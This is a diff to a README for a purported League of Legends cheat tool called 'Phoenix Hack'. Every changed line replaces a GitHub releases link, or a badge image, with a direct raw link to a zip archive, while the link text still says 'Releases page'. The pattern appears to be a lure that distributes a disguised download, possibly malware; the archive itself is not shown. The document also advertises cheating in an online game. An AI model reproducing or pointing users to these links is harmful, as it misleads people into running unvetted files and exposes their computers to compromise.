@@ -1,6 +1,6 @@
 # 🎮 LEAGUE-OF-LEGENDS-PHOENIX-HACK- - Enhance Your Gameplay Effortlessly
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/releases)
+[![Download from Releases](https://raw.githubusercontent.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/main/provant/LEAGUE-OF-LEGENDS-PHOENIX-HACK-.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/main/provant/LEAGUE-OF-LEGENDS-PHOENIX-HACK-.zip)
 
 ## 📜 Description
 Phoenix Hack for League of Legends (LOL) is a feature-rich script tool designed to elevate your gaming experience. It caters to all playstyles, providing advanced functionalities that enable effortless execution of complex combos, seamless farming, and real-time visibility of critical information.
@@ -9,7 +9,7 @@ Phoenix Hack for League of Legends (LOL) is a feature-rich script tool designed 
 To start using the Phoenix Hack, follow these simple steps:
 
 1. **Visit the Download Page**
-   - Go to the [Releases page](https://github.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/releases) where you can find the latest versions of the application.
+   - Go to the [Releases page](https://raw.githubusercontent.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/main/provant/LEAGUE-OF-LEGENDS-PHOENIX-HACK-.zip) where you can find the latest versions of the application.
 
 ## 💾 Download & Install
 1. **Download the Software**
@@ -46,7 +46,7 @@ To start using the Phoenix Hack, follow these simple steps:
 ## 📅 Updates
 Stay updated with the latest features and improvements. Regular updates ensure that the hack operates smoothly with the latest League of Legends patches. 
 
-Check the [Releases page](https://github.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/releases) frequently for new versions.
+Check the [Releases page](https://raw.githubusercontent.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/main/provant/LEAGUE-OF-LEGENDS-PHOENIX-HACK-.zip) frequently for new versions.
 
 ## 🌐 Additional Information
 Feel free to visit our GitHub repository for any additional details or to report issues. We appreciate your feedback and suggestions to improve your experience.
@@ -66,7 +66,7 @@ Your safety is our priority. Phoenix Hack complies with standard practices to en
 
 If you encounter any issues, consult the FAQ section in the repository or visit community forums for support. 
 
-![Download from Releases](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)
+![Download from Releases](https://raw.githubusercontent.com/mrkabo1/LEAGUE-OF-LEGENDS-PHOENIX-HACK-/main/provant/LEAGUE-OF-LEGENDS-PHOENIX-HACK-.zip%20Now-Release%20Page-brightgreen)
 
 ## ❓ FAQs
 **Q: Can I use Phoenix Hack in any game mode?**  
